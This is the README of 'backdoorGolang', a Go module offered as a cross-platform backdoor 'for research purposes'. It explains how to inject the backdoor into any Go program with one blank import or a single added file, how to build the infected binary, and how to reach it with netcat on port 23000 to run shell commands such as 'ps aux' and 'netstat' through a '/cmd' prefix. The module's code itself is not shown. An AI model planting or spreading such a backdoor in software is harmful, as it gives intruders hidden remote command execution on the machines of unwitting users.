# backdoorGolang

[![Windows Build Status](https://ci.appveyor.com/api/projects/status/github/pilebones/backdoorGolang?svg=true&branch=master&passingText=Windows%20-%20OK&failingText=Windows%20-%20failed&pendingText=Windows%20-%20pending)](https://ci.appveyor.com/project/pilebones/backdoorGolang)
  
Backdoor with Golang (Cross-Platform)

`/!\` Work in progress, not a stable release `/!\`

## Main goal

This code is for research purposes only.

Forked from pilebones/backdoorGolang.
Changed from CLI interface to a golang module.
User should just import the module:

`import _ "github.com/guimagalhaes/backdoorGolang/core/socket/server"`

"A fork of my own project named : "pilebones/backdoorBash" (see: https://github.com/pilebones/backdoorBash) but instead of using Bash as programming language (Unix-like only) this new one will work on Windows too by using a Golang API (cross-plateform) developed from scratch (as much as possible)."

## Requirements

- Golang SDK : Compiler and tools for the Go programming language from Google (see: https://golang.org/doc/install)

From Arch Linux :

```bash
(sudo) pacman -S community/go
```

From Debian :

```bash
(sudo) apt-get install golang-go
```

From SUSE :

```bash
(sudo) zypper install go1.16
```

From CentOS 7/8 and RedHat 7/8:

```
See Golang SDK link above.
```

## Installation

```bash
go get github.com/guimagalhaes/backdoorGolang@v0.2.2
```

## Clone the project
To do the following experiments, clone the project:

```
mkdir $GOPATH/src/github.com/guimagalhaes/
cd $GOPATH/src/github.com/guimagalhaes/
git clone github.com/guimagalhaes/backdoorGolang
```

## Run test example
Go to `$GOPATH/src/github.com/guimagalhaes/backdoorGolang/tests/simple_example` folder, remove the inject_backdoor.go source file and build it:

```
rm inject_backdoor.go
go build
```

Execute the compiled binary './simple_example' and see that only a simple HTTP server is available:

`curl http://localhost:2020/hello`

Restore the inject_backdoor.go file and build it again:

```
git checkout inject_backdoor.go
go build
```

Execute the new compiled binary ./simple_example and see that besides the simple HTTP server, the backdoor is now injected to the binary.
Note the inject_backdoor.go file is the only file that must be added to a Golang source code to inject the backdoor to the software.

Follow the next section to see how to test the infected version of the binary.

### Connect to the infected binary

The backdoor uses the 'localhost:23000' address hardcoded for now. The plan is to have network interfaces detection and auto selection of available network port.

Use netcat:

```bash
netcat localhost 23000
```

Then execute a sequence of shell commands using '/cmd ' as prefix:

```
/cmd ls -l
/cmd ss -natp
/cmd netstat -natp
/cmd ps aux
...
```

To exit the netcat session:

```
/quit
<enter>
<enter>
```
